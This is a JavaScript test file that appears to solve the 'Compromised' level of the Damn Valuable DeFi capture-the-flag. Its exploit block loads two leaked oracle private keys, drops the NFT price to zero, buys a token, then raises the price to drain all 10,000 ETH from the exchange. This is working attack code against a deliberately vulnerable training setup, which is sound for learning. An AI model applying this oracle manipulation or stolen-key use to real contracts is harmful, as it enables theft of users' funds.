const { ether, balance } = require('@openzeppelin/test-helpers');
const { accounts, contract, web3 } = require('@openzeppelin/test-environment');

const Exchange = contract.fromArtifact('Exchange');
const DamnValuableNFT = contract.fromArtifact('DamnValuableNFT');
const TrustfulOracle = contract.fromArtifact('TrustfulOracle');
const TrustfulOracleInitializer = contract.fromArtifact('TrustfulOracleInitializer');

const { expect } = require('chai');

describe('Compromised challenge', function () {

    const sources = [
        '0xA73209FB1a42495120166736362A1DfA9F95A105',
        '0xe92401A4d3af5E446d93D11EEc806b1462b39D15',
        '0x81A5D6E50C214044bE44cA0CB057fe119097850c'
    ];

    const [deployer, attacker] = accounts;
    const EXCHANGE_INITIAL_ETH_BALANCE = ether('10000');
    const INITIAL_NFT_PRICE = ether('999');

    before(async function () {
        /** SETUP - NO NEED TO CHANGE ANYTHING HERE */

        // Fund the trusted source addresses
        await web3.eth.sendTransaction({ from: deployer, to: sources[0], value: ether('5') });
        await web3.eth.sendTransaction({ from: deployer, to: sources[1], value: ether('5') });
        await web3.eth.sendTransaction({ from: deployer, to: sources[2], value: ether('5') });

        // Deploy the oracle and setup the trusted sources with initial prices
        this.oracle = await TrustfulOracle.at(
            await (await TrustfulOracleInitializer.new(
                sources,
                ["DVNFT", "DVNFT", "DVNFT"],
                [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE],
                { from: deployer }
            )).oracle()
        );

        // Deploy the exchange and get the associated ERC721 token
        this.exchange = await Exchange.new(
            this.oracle.address,
            { from: deployer, value: EXCHANGE_INITIAL_ETH_BALANCE }
        );
        this.token = await DamnValuableNFT.at(await this.exchange.token());

        // Keep track of attacker's initial ETH balance
        this.initialAttackerbalance = await balance.current(attacker);
    });

    it('Exploit', async function () {
        /** YOUR EXPLOIT GOES HERE */

        const abi = [{
            "inputs": [
              {
                "internalType": "string",
                "name": "symbol",
                "type": "string"
              },
              {
                "internalType": "uint256",
                "name": "newPrice",
                "type": "uint256"
              }
            ],
            "name": "postPrice",
            "outputs": [],
            "stateMutability": "nonpayable",
            "type": "function"
          }];

        // Keys are from the message intercepted, transformed from hex and base64
        const keys = [
            "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9",
            "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48"
        ];
        web3.eth.accounts.wallet.add(keys[0]);
        web3.eth.accounts.wallet.add(keys[1]);

        const contract = new web3.eth.Contract(abi, this.oracle.address);
        
        // Set price to 0
        await contract.methods.postPrice("DVNFT", 0).send({from: web3.eth.accounts.wallet[0].address, gas: ether('0.0000000000001')});
        await contract.methods.postPrice("DVNFT", 0).send({from: web3.eth.accounts.wallet[1].address, gas: ether('0.0000000000001')});

        // Buy one
        const evt = await this.exchange.buyOne({from: attacker, value: ether("0.1")});
        const tokenId = evt.logs[0].args.tokenId.toString();

        // Set price to max
        await contract.methods.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE.toString()).send({from: web3.eth.accounts.wallet[0].address, gas: ether('0.0000000000001')});
        await contract.methods.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE.toString()).send({from: web3.eth.accounts.wallet[1].address, gas: ether('0.0000000000001')});

        // Sell one
        await this.token.approve(this.exchange.address, tokenId, {from: attacker});
        await this.exchange.sellOne(1, {from: attacker});

    });

    after(async function () {
        // Exchange must have lost all ETH
        expect(
            await balance.current(this.exchange.address)
        ).to.be.bignumber.eq('0');
    });
});
